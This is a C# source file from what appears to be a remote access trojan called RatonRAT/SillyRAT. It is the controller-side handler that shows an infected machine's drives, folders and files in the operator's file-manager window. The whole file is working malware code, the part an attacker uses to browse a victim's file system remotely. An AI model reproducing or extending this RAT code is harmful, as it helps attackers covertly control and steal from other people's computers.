using System.Collections.Generic;
using Server.Connection;
using Stuff;
using System.Windows.Forms;
using RatonRAT.ClientForms;
using System.IO;
using System.Drawing;
using System;
using SillyRAT;

namespace Server.Handlers
{
    internal class HandleFileManager
    {
        public HandleFileManager(SillyClient SillyClient, Unpack unpack)
        {
            string formname = "FM | Client ID: ";
            FormFileManager fileManagerForm = (FormFileManager)Application.OpenForms[formname + unpack.GetAsString("UID")];
            if (fileManagerForm != null)
            {
                if (fileManagerForm.SillyClient == null)
                {
                    fileManagerForm.SillyClient = SillyClient;
                    fileManagerForm.timer1.Start();
                }
                fileManagerForm.Invoke(new MethodInvoker(() =>
                {
                    switch (unpack.GetAsString("Action"))
                    {
                        case "Drives":
                            {
                                Dictionary<string, object> dict = unpack.GetAll();
                                fileManagerForm.comboBox1.Items.Clear();
                                fileManagerForm.textBox1.Text = string.Empty;
                                foreach (var dictItem in dict)
                                {
                                    if (dictItem.Key == "Packet") continue;
                                    if (dictItem.Key == "UID") continue;
                                    if (dictItem.Key == "Action") continue;
                                    fileManagerForm.comboBox1.Items.Add(dictItem.Key);
                                }
                                fileManagerForm.comboBox1.SelectedIndex = 0;
                                break;
                            }
                        case "Goto":
                            {
                                fileManagerForm.label3.Visible = false;
                                fileManagerForm.listView1.Items.Clear();
                                fileManagerForm.textBox1.Text = unpack.GetAsString("CurrentPath");
                                string folders = unpack.GetAsString("Folders");
                                string files = unpack.GetAsString("Files");
                                string[] folderList = folders.Split(new[] { "-=>" }, StringSplitOptions.None);
                                string[] fileList = files.Split(new[] { "-=>" }, StringSplitOptions.None);
                                fileManagerForm.imageList1.Images.Clear();
                                fileManagerForm.listView1.BeginUpdate();
                                fileManagerForm.imageList1.Images.Add("foldershit", (Image)RatonRAT.Properties.Resources.Folder.Clone());
                                for (int i = 0; i < folderList.Length - 1; i++)
                                {
                                    ListViewItem listViewItem = new ListViewItem();
                                    listViewItem.Text = folderList[i];
                                    listViewItem.SubItems.Add(folderList[i + 1]);
                                    listViewItem.SubItems.Add("Folder");
                                    listViewItem.SubItems.Add(string.Empty);
                                    listViewItem.Tag = folderList[i + 2];
                                    listViewItem.ImageKey = "foldershit";
                                    fileManagerForm.listView1.Items.Add(listViewItem);
                                    i += 2;
                                }
                                for (int i = 0; i < fileList.Length - 1; i++)
                                {
                                    ListViewItem listViewItem = new ListViewItem();
                                    listViewItem.Text = fileList[i];
                                    listViewItem.SubItems.Add(fileList[i + 1]);
                                    listViewItem.SubItems.Add(fileList[i + 2]);
                                    listViewItem.SubItems.Add(fileList[i + 3]);
                                    listViewItem.SubItems.Add(fileList[i + 4]);
                                    listViewItem.Tag = fileList[i + 4];
                                    Image fileIcon = Image.FromStream(new MemoryStream(Convert.FromBase64String(fileList[i + 5])));
                                    fileManagerForm.imageList1.Images.Add(fileList[i], fileIcon);
                                    listViewItem.ImageKey = fileList[i];
                                    fileManagerForm.listView1.Items.Add(listViewItem);
                                    i += 5;
                                }
                                fileManagerForm.listView1.AutoResizeColumns(ColumnHeaderAutoResizeStyle.ColumnContent);
                                fileManagerForm.listView1.EndUpdate();
                                fileManagerForm.listView1.Visible = true;
                                fileManagerForm.listView1.Enabled = true;
                                break;
                            }
                    }
                }));
            }

        }
    }
}
